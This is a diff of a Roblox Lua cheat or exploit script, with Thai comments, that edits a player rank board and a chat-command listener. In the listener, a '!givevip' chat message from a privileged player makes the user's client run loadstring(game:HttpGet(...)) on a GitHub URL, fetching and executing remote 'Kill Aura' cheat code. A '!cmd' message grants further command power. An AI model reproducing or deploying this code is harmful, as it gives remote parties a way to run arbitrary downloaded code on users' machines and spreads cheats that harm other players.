@@ -227,17 +227,27 @@ local MinAdminBtn = CreateBtn("🛡", UDim2.new(0.5, -180, 0.5, -125), Color3.fr
 MinAdminBtn.Visible = (ADMIN_COMMANDER[Player.Name] ~= nil)
 MinAdminBtn.MouseButton1Click:Connect(function() AdminPanel.Visible = not AdminPanel.Visible end)
 
+-- [จุดแก้ไข] ปรับปรุง UpdateBoard ให้แสดงทุกคนที่รันสคริปต์และสิทธิ์ที่ได้รับ
 local function UpdateBoard()
     for _, v in pairs(Scroll:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
     Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
     for _, p in pairs(game.Players:GetPlayers()) do
         local isRunning = p:FindFirstChild("ScriptWord_Active")
+        -- แสดงชื่อคนบนบอร์ดถ้าเขารันสคริปต์อยู่ หรือมีสิทธิ์พิเศษ
         if isRunning or _G.VIP_LIST[p.Name] or ADMIN_COMMANDER[p.Name] or GIFTED_LIST[p.Name] or HAS_COMMAND_POWER[p.Name] then
-            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100)
-            if ADMIN_COMMANDER[p.Name] then tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
-            elseif _G.VIP_LIST[p.Name] then tag, color = "[VIP]", Color3.fromRGB(255,215,0)
-            elseif HAS_COMMAND_POWER[p.Name] then tag, color = "[CMD]", Color3.fromRGB(255,0,255)
-            elseif GIFTED_LIST[p.Name] then tag, color = "[GFT]", Color3.fromRGB(0,255,255) end
+            local tag, color = "[ACTIVE]", Color3.fromRGB(100, 255, 100) -- ค่าเริ่มต้นสำหรับคนรันสคริปต์
+            
+            -- จัดลำดับความสำคัญของสิทธิ์
+            if ADMIN_COMMANDER[p.Name] then 
+                tag, color = "[CREATOR]", Color3.fromRGB(255,50,50)
+            elseif _G.VIP_LIST[p.Name] then 
+                tag, color = "[VIP]", Color3.fromRGB(255,215,0)
+            elseif HAS_COMMAND_POWER[p.Name] then 
+                tag, color = "[CMD]", Color3.fromRGB(255,0,255)
+            elseif GIFTED_LIST[p.Name] then 
+                tag, color = "[GFT]", Color3.fromRGB(0,255,255) 
+            end
+
             local l = Instance.new("TextLabel", Scroll)
             l.Size = UDim2.new(1, -5, 0, 22); l.Text = " " .. tag .. " " .. p.Name
             l.TextColor3 = color; l.BackgroundTransparency = 1; l.Font = Enum.Font.FredokaOne; l.TextSize = 12
@@ -263,11 +273,10 @@ local function ListenChat(speaker, msg)
     if hasPower then
         if speaker ~= Player then PlayUISound(203785501) end
         
-        -- [Fix: Give VIP Logic] ตรวจสอบว่า target คือ Player คนนี้หรือไม่
+        -- [Give VIP Logic]
         if cmd == "!givevip" and target == Player then
             GIFTED_LIST[Player.Name] = speaker.Name
             UpdateBoard()
-            -- รันสคริปต์ Kill Aura ตัวที่ต้องการทันที
             loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
         end
 
@@ -286,7 +295,7 @@ local function ListenChat(speaker, msg)
         end
     end
 
-    -- [Modified] เมื่อได้รับ !cmd ให้เด้ง UI และปุ่มขึ้นมาทันที
+    -- [Give Command Logic]
     if ADMIN_COMMANDER[speaker.Name] and cmd == "!cmd" and target == Player then 
         HAS_COMMAND_POWER[Player.Name] = true
         AdminPanel.Visible = true
